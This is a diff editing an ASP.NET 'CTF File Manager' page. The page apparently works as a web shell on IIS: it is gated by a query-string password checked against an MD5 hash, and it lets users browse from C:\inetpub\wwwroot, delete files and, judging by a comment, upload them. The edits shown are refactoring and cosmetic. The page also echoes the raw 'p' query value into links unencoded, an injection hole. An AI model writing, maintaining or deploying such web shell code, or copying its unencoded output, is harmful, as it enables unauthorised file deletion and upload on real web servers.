@@ -35,16 +35,11 @@
         if (!string.IsNullOrEmpty(Request.QueryString["del"]))
         {
             DeleteFile(Request.QueryString["del"]);
-            Response.Redirect(GetCurrentUrl() + "&msg=deleted");
+            Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=ok");
         }
 
         if (Request.QueryString["msg"] != null)
             lblMsg.Text = "<span style='color:lime'>✅ Success!</span>";
-    }
-
-    string GetCurrentUrl()
-    {
-        return "?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath);
     }
 
     bool VerifyMD5(string input, string correctHash)
@@ -118,11 +113,12 @@
     </style>
 </head>
 <body>
-    <h1>🛠️ CTF File Manager - inetpub/wwwroot</h1>
+    <h1>🛠️ CTF File Manager</h1>
 
     <div class="current-path">
         <strong>Current Path:</strong> <%= currentPath %>
-        <br><a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Reset to Web Root ]</a>
+        <br>
+        <a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Reset to C:\inetpub\wwwroot ]</a>
     </div>
 
     <!-- Upload -->
@@ -147,23 +143,23 @@
         </tr>
 
         <!-- Go Up -->
-        <% 
-            if (currentPath.Length > 3) 
+        <%
+            if (currentPath.Length > 3)
             {
-                DirectoryInfo parent = Directory.GetParent(currentPath);
-                if (parent != null)
+                DirectoryInfo parentDir = Directory.GetParent(currentPath);
+                if (parentDir != null)
                 {
         %>
         <tr>
-            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent.FullName) %>">.. (Go Up)</a></td>
+            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parentDir.FullName) %>">.. (Go Up)</a></td>
             <td>Folder</td>
             <td></td>
             <td></td>
             <td></td>
         </tr>
-        <% 
+        <%
                 }
-            } 
+            }
         %>
 
         <% 
